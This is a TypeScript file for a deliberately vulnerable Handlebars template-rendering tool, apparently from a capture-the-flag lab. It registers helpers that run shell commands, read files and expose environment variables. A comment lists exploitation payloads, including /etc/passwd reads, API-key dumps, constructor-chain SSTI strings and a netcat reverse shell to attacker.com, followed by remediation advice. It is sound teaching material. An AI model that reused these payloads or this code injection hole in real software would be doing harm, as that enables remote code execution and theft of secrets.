/**
 * Template Renderer Tool - Server-Side Template Injection (SSTI)
 *
 * ⚠️  VULNERABILITY: Server-Side Template Injection (CWE-1336)
 * This tool renders Handlebars templates without sandboxing.
 * Attackers can inject template syntax to execute arbitrary code.
 *
 * EDUCATIONAL PURPOSE: Demonstrates SSTI leading to RCE.
 */

import Handlebars from 'handlebars';

export const renderTemplateTool = {
  name: 'render_template',
  description: 'Renders Handlebars templates with provided data. Supports all Handlebars syntax including helpers and expressions.',
  inputSchema: {
    type: 'object',
    properties: {
      template: {
        type: 'string',
        description: 'The Handlebars template string (e.g., "Hello {{name}}!")',
      },
      data: {
        type: 'object',
        description: 'Data object to pass to the template',
        default: {},
      },
    },
    required: ['template'],
  },
};

export async function handleRenderTemplate(args: any) {
  const { template, data = {} } = args;

  try {
    // VULNERABILITY: Rendering user-controlled templates without sandboxing!
    // Should restrict template syntax or use a safe templating engine

    // VULNERABILITY: Registering dangerous helpers
    Handlebars.registerHelper('exec', function(command: string) {
      // This is EXTREMELY dangerous!
      const { execSync } = require('child_process');
      return execSync(command, { encoding: 'utf-8' });
    });

    Handlebars.registerHelper('readFile', function(path: string) {
      // This allows arbitrary file reading!
      const { readFileSync } = require('fs');
      return readFileSync(path, 'utf-8');
    });

    Handlebars.registerHelper('getEnv', function(varName: string) {
      // Exposes environment variables!
      return process.env[varName] || 'Not found';
    });

    // WRONG: Compiling and executing user-provided template
    const compiledTemplate = Handlebars.compile(template);
    const result = compiledTemplate(data);

    return {
      content: [
        {
          type: 'text',
          text: `Template rendered successfully!\n\nTemplate:\n${template}\n\nResult:\n${result}`,
        },
      ],
    };
  } catch (error: any) {
    // VULNERABILITY: Detailed template compilation errors
    return {
      content: [
        {
          type: 'text',
          text: `Template rendering failed!\n\nTemplate: ${template}\n\nError: ${error.message}\n\nStack: ${error.stack}\n\nAvailable helpers: exec, readFile, getEnv\nAvailable data: ${JSON.stringify(data, null, 2)}`,
        },
      ],
      isError: true,
    };
  }
}

/*
EXPLOITATION EXAMPLES:

1. Basic data access:
   template: "Hello {{name}}!"
   data: { "name": "World" }

2. Execute system commands:
   template: "{{exec 'whoami'}}"
   template: "{{exec 'cat /data/secrets/flags.txt'}}"
   template: "{{exec 'env | grep FLAG'}}"

3. Read arbitrary files:
   template: "{{readFile '/etc/passwd'}}"
   template: "{{readFile '/data/secrets/flags.txt'}}"

4. Access environment variables:
   template: "{{getEnv 'FLAG_TEMPLATE_HACKER'}}"
   template: "{{getEnv 'API_KEY'}}"

5. Complex template injection:
   template: "User: {{name}}\nFlag: {{exec 'cat /data/secrets/flags.txt'}}"

6. Nested expressions:
   template: "{{#each (exec 'ls /data/secrets')}}{{this}}\n{{/each}}"

7. CTF Flag:
   template: "{{readFile 'data/secrets/flags.txt'}}"
   OR
   template: "{{exec 'env | grep FLAG_TEMPLATE'}}"
   Expected: FLAG{template_hacker}

8. Remote Code Execution:
   template: "{{exec 'node -e \"require('child_process').exec('nc attacker.com 4444 -e /bin/bash')\"'}}"

HANDLEBARS SSTI PAYLOADS:
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami')}}
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}
{{this.constructor.constructor('return process')().env}}

REMEDIATION:
- Never render user-controlled templates
- Use a sandboxed template engine (like Handlebars in strict mode)
- Disable dangerous helpers and features
- Use logic-less templates (Mustache)
- Implement allowlist of permitted template syntax
- Run template engine in isolated environment
- Don't register custom helpers that access system resources
*/
